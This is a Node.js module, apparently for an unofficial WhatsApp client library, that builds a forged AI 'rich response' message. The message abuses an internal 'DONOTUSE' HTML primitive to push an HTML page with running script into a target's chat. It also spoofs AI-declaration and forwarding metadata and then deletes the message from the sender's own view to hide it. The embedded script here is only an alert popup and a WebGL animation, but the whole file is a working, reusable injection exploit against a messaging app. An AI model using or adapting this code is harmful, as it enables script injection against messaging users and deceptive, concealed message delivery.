const crypto = require("crypto")

async function slof(sock, jid, hideFromSelf = true) {
    const slots = {
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    unifiedResponse: {
                        data: Buffer.from(JSON.stringify({
                            __typename: "GenAIUnifiedResponse",
                            response_id: crypto.randomUUID(),
                            sections: [{
                                __typename: "GenAIUnifiedResponseSection",
                                view_model: {
                                    __typename: "GenAISingleLayoutViewModel",
                                    primitive: {
                                        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
                                        trusted_sources: [],
                                        payload: `<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>3D VFX Test</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
html,body{width:100%;height:100%;overflow:hidden;background:#000}
canvas{width:100%;height:100%;display:block}
</style>
</head>
<body>
<canvas id="c"></canvas>
<script>
alert('Beta Test Popup by Slof');
(()=>{
const N=2;
const canvas=document.querySelector('#c');
const gl=canvas.getContext('webgl',{antialias:false,alpha:false});
if(!gl)return;

const V=\`
attribute vec3 p;
uniform mat4 proj,model;
varying vec3 v;
void main(){
 v=p;
 gl_Position=proj*model*vec4(p,1.);
}\`;
const F=\`
precision mediump float;
varying vec3 v;
uniform vec3 color;
uniform float tm;
void main(){
 vec3 n=normalize(v);
 float light=.25+.75*max(0.,dot(n,normalize(vec3(-.5,.8,1.))));
 float edge=pow(1.-abs(n.z),3.);
 vec3 c=color*light+color*edge*2.0;
 c*=.85+.15*sin(tm*5.+v.y*4.);
 gl_FragColor=vec4(c,1.);
}\`;
function shader(type,src){
 const s=gl.createShader(type);
 gl.shaderSource(s,src);gl.compileShader(s);
 if(!gl.getShaderParameter(s,gl.COMPILE_STATUS))
  throw Error(gl.getShaderInfoLog(s));
 return s;
}
const pr=gl.createProgram();
gl.attachShader(pr,shader(gl.VERTEX_SHADER,V));
gl.attachShader(pr,shader(gl.FRAGMENT_SHADER,F));
gl.linkProgram(pr);
if(!gl.getProgramParameter(pr,gl.LINK_STATUS))return;
gl.useProgram(pr);

const verts=new Float32Array([
 -1,-1,-1, 1,-1,-1, 1,1,-1,-1,1,-1,
 -1,-1,1, 1,-1,1, 1,1,1,-1,1,1
]);
const faces=[
 0,2,1,0,3,2,4,5,6,4,6,7,
 0,1,5,0,5,4,2,3,7,2,7,6,
 0,4,7,0,7,3,1,2,6,1,6,5
];
const expanded=[];
for(const i of faces)expanded.push(verts[i*3],verts[i*3+1],verts[i*3+2]);
const buf=gl.createBuffer();
gl.bindBuffer(gl.ARRAY_BUFFER,buf);
gl.bufferData(gl.ARRAY_BUFFER,new Float32Array(expanded),gl.STATIC_DRAW);
const p=gl.getAttribLocation(pr,'p');
gl.enableVertexAttribArray(p);
gl.vertexAttribPointer(p,3,gl.FLOAT,false,0,0);
const proj=gl.getUniformLocation(pr,'proj');
const model=gl.getUniformLocation(pr,'model');
const color=gl.getUniformLocation(pr,'color');
const tm=gl.getUniformLocation(pr,'tm');

function perspective(){
 const a=canvas.width/canvas.height,f=1/Math.tan(.5);
 return new Float32Array([
 f/a,0,0,0, 0,f,0,0,
 0,0,-1.002,-1, 0,0,-.2002,0
 ]);
}
function matrix(x,y,z,a,b,c,s){
 const A=Math.cos(a),B=Math.sin(a),C=Math.cos(b),D=Math.sin(b),
 E=Math.cos(c),F=Math.sin(c);
 return new Float32Array([
 C*E*s,(A*F+B*D*E)*s,(B*F-A*D*E)*s,0,
 -C*F*s,(A*E-B*D*F)*s,(B*E+A*D*F)*s,0,
 D*s,-B*C*s,A*C*s,0,
 x,y,z,1
 ]);
}
const cubes=Array.from({length:N},(_,i)=>({
 x:(i-(N-1)/2)*2.5,y:0,z:-5,
 a:Math.random()*6,b:Math.random()*6,c:0,
 vx:(Math.random()-.5)*.04,
 vy:(Math.random()-.5)*.04,
 hue:i/N
}));

const fx=document.createElement('canvas');
fx.style.cssText='position:fixed;inset:0;width:100%;height:100%;pointer-events:none';
document.body.appendChild(fx);
const ctx=fx.getContext('2d');
let W,H,dpr;
function resize(){
 dpr=Math.min(devicePixelRatio||1,1.5);
 W=innerWidth;H=innerHeight;
 canvas.width=fx.width=Math.floor(W*dpr);
 canvas.height=fx.height=Math.floor(H*dpr);
 gl.viewport(0,0,canvas.width,canvas.height);
 gl.uniformMatrix4fv(proj,false,perspective());
 ctx.setTransform(dpr,0,0,dpr,0,0);
}
const sparks=Array.from({length:100},()=>({
 x:Math.random()*innerWidth,y:Math.random()*innerHeight,
 vx:(Math.random()-.5)*3,vy:(Math.random()-.5)*3,
 life:Math.random(),size:Math.random()*2+1
}));
let start=performance.now(),last=0;
function frame(now){
 requestAnimationFrame(frame);
 if(now-last<16)return;
 last=now;
 const t=(now-start)/1000;

 gl.clearColor(0,0,0,1);
 gl.clear(gl.COLOR_BUFFER_BIT|gl.DEPTH_BUFFER_BIT);
 gl.enable(gl.DEPTH_TEST);

 cubes.forEach((b,i)=>{
  b.x+=b.vx;b.y+=b.vy;
  if(Math.abs(b.x)>4)b.vx*=-1;
  if(Math.abs(b.y)>2.5)b.vy*=-1;
  b.a+=.015;b.b+=.022;b.c+=.009;
  gl.uniformMatrix4fv(model,false,
   matrix(b.x+Math.sin(t+i)*.25,b.y+Math.cos(t+i)*.3,b.z,
   b.a,b.b,b.c,.48));
  gl.uniform3f(color,
   .25+.75*Math.sin(b.hue*6.28)**2,
   .25+.75*Math.sin(b.hue*6.28+2)**2,
   .6+.4*Math.sin(b.hue*6.28+4)**2);
  gl.uniform1f(tm,t);
  gl.drawArrays(gl.TRIANGLES,0,36);
 });

 ctx.clearRect(0,0,W,H);
 ctx.globalCompositeOperation='lighter';

 cubes.forEach((b,i)=>{
  const x=W/2+b.x*W/9;
  const y=H/2-b.y*H/5;
  const hue=(t*80+i*160)%360;

  for(let k=0;k<3;k++){
   const r=25+((t*100+k*55)%110);
   ctx.beginPath();
   ctx.ellipse(x,y,r,r*.55,t*.5+k,0,Math.PI*2);
   ctx.strokeStyle=\`hsla(\${hue+k*35},100%,65%,\${1-r/150})\`;
   ctx.lineWidth=2.5;
   ctx.shadowBlur=20;
   ctx.shadowColor=\`hsl(\${hue},100%,60%)\`;
   ctx.stroke();
  }

  for(let k=0;k<7;k++){
   const a=t*2+k*Math.PI*2/7;
   ctx.beginPath();
   ctx.moveTo(x,y);
   let px=x,py=y;
   for(let j=0;j<7;j++){
    const d=8+Math.random()*13;
    px+=Math.cos(a)*d+(Math.random()-.5)*15;
    py+=Math.sin(a)*d+(Math.random()-.5)*15;
    ctx.lineTo(px,py);
   }
   ctx.strokeStyle=\`hsla(\${hue},100%,70%,.65)\`;
   ctx.lineWidth=1.4;
   ctx.stroke();
  }

  const g=ctx.createRadialGradient(x,y,0,x,y,70);
  g.addColorStop(0,\`hsla(\${hue},100%,70%,.45)\`);
  g.addColorStop(1,\`hsla(\${hue},100%,50%,0)\`);
  ctx.fillStyle=g;
  ctx.fillRect(x-70,y-70,140,140);
 });

 sparks.forEach(s=>{
  s.x+=s.vx;s.y+=s.vy;
  if(s.x<0||s.x>W)s.vx*=-1;
  if(s.y<0||s.y>H)s.vy*=-1;
  ctx.beginPath();
  ctx.arc(s.x,s.y,s.size,0,Math.PI*2);
  ctx.fillStyle='rgba(100,190,255,.9)';
  ctx.shadowBlur=12;
  ctx.shadowColor='#258cff';
  ctx.fill();
 });
 ctx.shadowBlur=0;
 ctx.globalCompositeOperation='source-over';
}
resize();
addEventListener('resize',resize);
requestAnimationFrame(frame);
})();
</script>
</body>
</html>`
                                    }
                                }
                            }]
                        })).toString("base64")
                    },
                    contextInfo: {
                        isForwarded: true,
                        forwardOrigin: 4,
                        aiMetadata: {
                            aiDeclaration: {
                                aiType: 1
                            },
                            version: 1
                        }
                    }
                }
            }
        }
    }

    const msg = await generateWAMessageFromContent(jid, slots, {})
    await sock.relayMessage(jid, msg.message, { messageId: msg.key.id })

    if (hideFromSelf) {
        try {
            await sock.chatModify(
                {
                    deleteForMe: {
                        deleteMedia: false,
                        key: {
                            id: msg.key.id,
                            fromMe: true,
                            remoteJid: jid
                        },
                        timestamp: Date.now()
                    }
                },
                jid
            )
        } catch (e) {
            console.error("gagal delete-for-me:", e)
        }
    }
}

module.exports = slof
